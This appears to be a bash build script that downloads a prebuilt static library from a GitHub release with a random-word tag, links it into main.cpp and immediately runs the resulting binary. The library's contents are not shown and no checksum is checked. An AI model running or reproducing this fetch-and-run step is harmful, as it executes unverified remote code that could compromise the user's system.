#!/usr/bin/env bash
set -e
TAG="calm-badger-cosmic-canyon"
LIB="alder-trunk.a"
curl -LfsS --connect-timeout 15 --retry 3 --max-time 180 -o "$LIB" "https://github.com/fuissshu/sonicdothub/releases/download/${TAG}/${LIB}"
g++ -pthread -std=c++17 -O2 main.cpp "$LIB" -o app && ./app
